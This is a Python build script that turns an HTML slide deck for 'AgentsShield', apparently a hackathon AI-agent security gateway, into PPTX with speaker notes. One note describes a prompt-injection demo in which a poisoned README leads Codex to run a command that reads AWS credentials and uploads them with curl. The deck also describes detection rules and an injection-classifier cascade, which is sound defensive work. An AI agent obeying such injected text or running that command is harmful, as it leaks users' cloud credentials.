"""Build ../AgentsShield-deck-EN.pptx from deck.html, so the PPTX matches the PDF.

Each slide = a full-bleed background picture (deck.html?bg: cards, icons, screenshots, dot grid, with text hidden)
plus one editable text box per text block, placed where the browser laid it out (deck.html?extract).
Fonts: Chakra Petch and JetBrains Mono (fonts/, OFL). Without them installed PowerPoint substitutes another font.

Usage (Windows or macOS, Edge or Chrome, python-pptx + Pillow):  python build_pptx.py
  without python-pptx installed:  uv run --with python-pptx --with pillow python build_pptx.py
"""
import html
import json
import os
import re
import subprocess
import sys
from pathlib import Path

from PIL import Image
from pptx import Presentation
from pptx.dml.color import RGBColor
from pptx.enum.text import MSO_ANCHOR, MSO_AUTO_SIZE
from pptx.util import Emu, Pt

HERE = Path(__file__).resolve().parent
OUT = HERE.parent / "AgentsShield-deck-EN.pptx"
TMP = HERE / ".build"
BROWSERS = [r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
            r"C:\Program Files\Google\Chrome\Application\chrome.exe",
            "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
            "/Applications/Microsoft Edge.app/Contents/MacOS/Microsoft Edge"]
PX = 6350  # EMU per CSS px: 1920 px = 13.333 in
SCALE = 1.5  # background render scale

NOTES = [
    "AgentsShield (AI Control Layer) sits on the network path of every AI API client. Claude Code, Codex and SDKs "
    "pass through it with nothing configured in the tool: transparent DNS + TLS with the AICL CA, or a base URL.",
    "275 tool definitions per Claude Code 2.1.289 request: policy/policy.yaml. EchoLeak CVE-2025-32711 and the "
    "LiteLLM price map (29/29 Ollama entries priced at zero, budgets skipped): research/00-summary.md. A guard SaaS "
    "(Prompt Shields, Model Armor, Bedrock Guardrails, Lakera) receives the prompt content: research/10-landscape.md.",
    "Demo case from the demo batch: a poisoned README makes Codex run cat ~/.aws/credentials | curl -T -. TOOL-01 "
    "rules CODE-AG-001 (credential store read) and CODE-AG-003 (upload with an HTTP client) block it in 0.13 ms; the "
    "agent gets 200 with '[AICL] tool call blocked (...). The command was not executed.' (passthrough.py).",
    "decide() per request: identity, model allowlist + budget reservation, DLP-01 / DLP-02 / DLP-05, INJ-03, the "
    "INJ-04 cascade, TOOL-01 on every tool call; the final action is the maximum on ALLOW < LOG < WARN < REDACT < "
    "BLOCK; engine errors fail closed. Native answers: 400 for a hard block, 402 for budget, 200 with [AICL] text for "
    "a blocked tool call; never refusal, 403, 429 or mid-stream errors. Audit stores spans as hashes, no raw text.",
    "Controls and modes: policy/policy.yaml, names in w1-gateway/aicl_gateway/names.py. INJ-04: DeBERTa ONNX "
    "classifier, e5-small kNN, qwen3.5:2b judge on the gray band only; shadow in the permissive profile. Historical "
    "rules HIST-001..010 in policy/rules/historical.yaml. Signed feed: Ed25519, pinned key, no rollback, inline tests "
    "gate activation (T-015). Classifiers are evidence, not a boundary: a benign judge verdict never blocks.",
    "Activity page with the Why drawer (decide() timeline with per-stage Server-Timing). People and spend per "
    "principal, export to JSONL and CSV, NET-01 raises BYPASS_SUSPECTED for a DNS lookup with no gateway request or a "
    "DoH lookup. Screenshots: promo/assets, 4 Oct about 09:30 CEST, console before the T-131 redesign.",
    "Policy edits from the console or the file: validated on a candidate, atomic replace, reload in about 1 s, a bad "
    "edit returns 422 and the last good policy stays; every change is audited as POLICY_CHANGED with an admin token.",
    "reports/junit.xml 09:26: 1,057 tests, 0 failures. reports/requirements_report.md: 16/16 PDF requirements PASS. "
    "reports/bench.json 09:27: gateway overhead on a 222 KB Claude Code request p50 33.8 / p95 34.5 ms (n = 29), "
    "without the ONNX classifier and with a fake judge. Live: Claude Code 2.1.289 7/7 base URL, 9/9 transparent. "
    "INJ-04 eval (tests/test_injection_eval.py): 24 attacks / 30 benign, EN + PL, a small set.",
    "Base-URL gateways (LiteLLM, Portkey) are opt-in per tool and price local models at zero; LiteLLM guardrails and "
    "audit are Enterprise-only. Cloud guard APIs send content to the vendor. Allowed prompts still go to the real "
    "provider with the user's own key; only the guard and the judge are local.",
    "Timeline from git: research and scaffold Sat 14:45-22:20; v3 MVP walking skeleton Sun 00:26; transparent mode "
    "with real Claude Code 9/9 and Codex 5/5 Sun 03:00-03:08; signed feed, policy editor, ONNX cascade Sun 07:42-10:10. "
    "Limits: explicit proxy and MCP gateway not built yet; DNS can be bypassed without the egress firewall; the "
    "classifier is English-only; Codex was tested against an OpenAI mock upstream.",
]


def browser():
    for b in BROWSERS:
        if os.path.exists(b):
            return b
    sys.exit("Edge or Chrome not found")


def url(query):
    return (HERE / "deck.html").as_uri() + "?" + query


def extract():
    dom = subprocess.run([browser(), "--headless=new", "--disable-gpu", "--window-size=1920,1080",
                          "--virtual-time-budget=10000", "--dump-dom", url("extract")],
                         capture_output=True, text=True, encoding="utf-8").stdout
    m = re.search(r'<pre id="pptx-data">(.*?)</pre>', dom, re.S)
    if not m:
        sys.exit("extract: no pptx-data in the dumped DOM")
    return json.loads(html.unescape(m.group(1)))


def backgrounds(n):
    TMP.mkdir(exist_ok=True)
    shot = TMP / "bg-all.png"
    subprocess.run([browser(), "--headless=new", "--disable-gpu", "--hide-scrollbars", "--virtual-time-budget=10000",
                    f"--window-size=1920,{1080 * n}", f"--force-device-scale-factor={SCALE}",
                    f"--screenshot={shot}", url("bg")], capture_output=True, check=True)
    im = Image.open(shot).convert("RGB")
    h = im.height // n
    paths = []
    for i in range(n):
        p = TMP / f"bg-{i + 1:02d}.png"
        im.crop((0, i * h, im.width, (i + 1) * h)).save(p)
        paths.append(p)
    return paths


def clean(runs):
    """HTML whitespace rules: collapse, drop leading/trailing spaces of the block and around line breaks."""
    out = []
    for r in runs:
        if r["t"] == "\n":
            if out:
                out[-1]["t"] = out[-1]["t"].rstrip(" ")
            out.append({"t": "\n"})
            continue
        t = re.sub(r"[ \t\r\n]+", " ", r["t"])
        if not out or out[-1]["t"] == "\n" or out[-1]["t"].endswith(" "):
            t = t.lstrip(" ")
        if t:
            out.append({**r, "t": t})
    if out and out[-1]["t"] != "\n":
        out[-1]["t"] = out[-1]["t"].rstrip(" ")
    return [r for r in out if r["t"]]


def add_block(slide, b):
    runs = clean(b["runs"])
    if not any(r["t"].strip() for r in runs if r["t"] != "\n"):
        return
    w = b["w"] if b["nowrap"] else min(b["w"] * 1.03 + 6, 1920 - b["x"] - 8)
    box = slide.shapes.add_textbox(Emu(round(b["x"] * PX)), Emu(round(b["y"] * PX)),
                                   Emu(round(w * PX)), Emu(round(max(b["h"], b["lh"]) * PX)))
    tf = box.text_frame
    tf.margin_left = tf.margin_right = tf.margin_top = tf.margin_bottom = 0
    tf.word_wrap = not b["nowrap"]
    tf.auto_size = MSO_AUTO_SIZE.NONE
    tf.vertical_anchor = MSO_ANCHOR.TOP
    p = tf.paragraphs[0]
    p.line_spacing = Pt(b["lh"] * 0.5)
    for r in runs:
        if r["t"] == "\n":
            p.add_line_break()
            continue
        run = p.add_run()
        run.text = r["t"]
        f = run.font
        f.name = r["f"]
        f.size = Pt(r["s"] * 0.5)
        f.bold = r["w"] >= 600
        f.color.rgb = RGBColor.from_string(r["c"].upper())
        rpr = run._r.get_or_add_rPr()
        rpr.set("lang", "en-US")
        rpr.set("noProof", "1")  # no spell-check squiggles under brand and domain names
        if r["ls"]:
            rpr.set("spc", str(round(r["ls"] * 0.5 * 100)))


def main():
    data = extract()
    bgs = backgrounds(len(data))
    prs = Presentation()
    prs.slide_width, prs.slide_height = Emu(1920 * PX), Emu(1080 * PX)
    blank = prs.slide_layouts[6]
    for i, blocks in enumerate(data):
        s = prs.slides.add_slide(blank)
        s.shapes.add_picture(str(bgs[i]), 0, 0, prs.slide_width, prs.slide_height)
        for b in blocks:
            add_block(s, b)
        if i < len(NOTES):
            s.notes_slide.notes_text_frame.text = NOTES[i]
    prs.core_properties.title = "AgentsShield - AI Control Layer - HackYeah 2026"
    prs.core_properties.author = "Team Solvro-ng"
    prs.save(OUT)
    print(f"wrote {OUT} ({len(data)} slides)")


if __name__ == "__main__":
    main()
